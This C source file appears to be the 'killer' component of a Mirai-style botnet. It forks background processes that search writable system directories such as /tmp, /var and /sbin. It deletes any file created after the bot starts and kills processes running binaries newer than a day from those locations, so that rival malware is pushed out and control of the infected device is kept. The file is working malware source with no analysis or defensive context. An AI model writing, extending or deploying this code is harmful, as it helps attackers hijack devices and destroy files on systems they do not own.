#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <limits.h>
#include <sys/types.h>
#include <dirent.h>
#include <signal.h>
#include <unistd.h>
#include <ctype.h>
#include <sys/stat.h>
#include <time.h>
#include <string.h>
#include <sys/prctl.h>

#include "headers/util.h"

int killer_pid = 0;
DIR *dir;
ssize_t len;
char self_path[64], exe_path[20], real_path[64];
char **found_dirs = NULL;  // Dynamic array
int num_found_dirs = 0;
struct dirent *entry;
char path[1024];
struct stat file_stat;
time_t start_time, current_time;

typedef struct FileList {
    char filename[PATH_MAX];
    time_t timestamp;
    struct FileList* next;
} FileList;

FileList* known_files = NULL;

void killer_kill(void) {
    if (killer_pid != 0) {
        kill(killer_pid, 9);
#ifdef DEBUG
        printf("Killed process with PID %d\n", killer_pid);
#endif
    }
}

void delete_if_new(const char *file_path) {
    if (stat(file_path, &file_stat) == -1) {
        return;
    }
    if (remove(file_path) == -1) {
        return;
    }
#ifdef DEBUG
    else {
        printf("Deleted file: %s\n", file_path);
    }
#endif
}

FileList* scan_directory(const char* directory) {
    dir = opendir(directory);
    if (!dir) {
        return NULL;
    }

    while ((entry = readdir(dir))) {
        if (entry->d_type == DT_REG) {
            char full_path[PATH_MAX];
            snprintf(full_path, sizeof(full_path), "%s/%s", directory, entry->d_name);
            stat(full_path, &file_stat);
            if (file_stat.st_mtime > start_time) {
                delete_if_new(full_path);
            }
        }
    }

    closedir(dir);
}

FileList* remove_from_list(const char* filename, FileList* head) {
    FileList* current = head;
    FileList* prev = NULL;
    while (current) {
        if (strcmp(current->filename, filename) == 0) {
            if (prev) {
                prev->next = current->next;
            } else {
                head = current->next;
            }
            free(current);
            return head;
        }
        prev = current;
        current = current->next;
    }
    return head;
}

void delete_init() {
    if (!fork()) {
        prctl(PR_SET_PDEATHSIG, SIGHUP);
        start_time = time(NULL);

        while (1) {
            for (int i = 0; i < num_found_dirs; i++) {
                known_files = scan_directory(found_dirs[i]);
            }

            FileList* current = known_files;
            while (current) {
                FileList* to_free = current;
                current = current->next;
                free(to_free);
            }

            usleep(10000);
        }
    }
}

void find_writeable_dirs(const char *directory) {
    DIR *dp = opendir(directory);
    if (!dp) return;
    if (access(directory, W_OK) == 0) {
#ifdef DEBUG
        printf("Found writable directory: %s\n", directory);
#endif
        found_dirs = realloc(found_dirs, (num_found_dirs + 1) * sizeof(char *));
        found_dirs[num_found_dirs] = strdup(directory);
        num_found_dirs++;
        return;
    }

    while ((entry = readdir(dp))) {
        if (entry->d_name[0] != '.' && entry->d_type == 4) {
            snprintf(path, sizeof(path), "%s/%s", directory, entry->d_name);
            find_writeable_dirs(path);
        }
    }

    closedir(dp);
}

char find() {
    rewinddir(dir);
    while ((entry = readdir(dir))) {
        if (!isdigit(entry->d_name[0])) continue;
        strcpy(exe_path, "/proc/");
        strcat(exe_path, entry->d_name);
        strcat(exe_path, "/exe");
        len = readlink(exe_path, real_path, sizeof(real_path) - 1);
        real_path[len] = '\0';
        if (strcmp(real_path, self_path) == 0) continue;
        for (int i = 0; i < num_found_dirs; i++) {
            if (strstr(real_path, found_dirs[i])) {
                if (!stat(real_path, &file_stat) && difftime(time(NULL), file_stat.st_ctime) < (60 * 60 * 24)) {
                    kill(util_atoi(entry->d_name, 10), 9);
#ifdef DEBUG
                    printf("Killed binary: %s on pid: %d\n", real_path, _atoi(entry->d_name));
#endif
                    break;
                }
            }
        }
    }

    return 1;
}

void killer_init(void) {
    if (!fork()) {
        if (!(dir = opendir("/proc/"))) return;
        const char *dirs_to_check[6] = { "hey skido" };
        dirs_to_check[0] = "/tmp";
        dirs_to_check[1] = "/opt";
        dirs_to_check[2] = "/home";
        dirs_to_check[3] = "/dev";
        dirs_to_check[4] = "/var";
        dirs_to_check[5] = "/sbin";
        for (int i = 0; i < 6; i++) {
            find_writeable_dirs(dirs_to_check[i]);
        }

        len = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1);
        self_path[len] = '\0';
        prctl(PR_SET_PDEATHSIG, SIGHUP);
        delete_init();
        while (1) { // nolint
            find();
            usleep(50000);
        }

        free(found_dirs);
        closedir(dir);
        exit(0);
    }
}
